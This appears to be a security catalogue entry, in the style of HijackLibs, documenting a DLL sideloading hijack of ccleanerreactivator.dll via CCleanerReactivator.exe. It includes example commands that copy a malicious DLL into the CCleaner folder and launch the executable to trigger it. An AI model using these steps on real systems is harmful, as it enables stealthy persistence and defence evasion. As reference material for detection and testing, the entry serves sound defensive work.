---
trust_level: community
id: windows-dllhijack-ccleanerreactivator
namespace: windows:dllhijack:ccleanerreactivator
name: ccleanerreactivator.dll
description: "ccleanerreactivator.dll — Sideloading hijacking (Gen Digital)"
author: "Still Hsu"
version: "1.0.0"
capabilities:
  - security.defenseevasion.dll-hijack
platforms:
  - windows
techniques:
  - defense-evasion
  - persistence
execution:
  template: "ccleanerreactivator.dll"
  sandbox: execFile
  timeout_seconds: 30
  shell: false
references:
  - label: "Reference"
    url: "https://www.virustotal.com/gui/file/d665f55555f87b515cb8ef1adce9592a83662a8c4efa34f6ffdd022475bd176a"
  - label: "Reference"
    url: "https://lab52.io/blog/2344-2/"
  - label: "HijackLibs"
    url: "https://hijacklibs.net/entries/ccleanerreactivator.html"
---
examples:
  - description: "Place malicious ccleanerreactivator.dll in the search order location"
    command: "copy malicious.dll \"%PROGRAMFILES%\\CCleaner\\ccleanerreactivator.dll\""
  - description: "Execute the vulnerable binary to trigger the hijack"
    command: "\"%PROGRAMFILES%\\CCleaner\\CCleanerReactivator.exe\""

# ccleanerreactivator.dll

**Vendor:** Gen Digital

**Expected Location:** %PROGRAMFILES%\CCleaner

**Vulnerable Executables:**
- %PROGRAMFILES%\CCleaner\CCleanerReactivator.exe (Sideloading)

**Acknowledgement:** Still Hsu
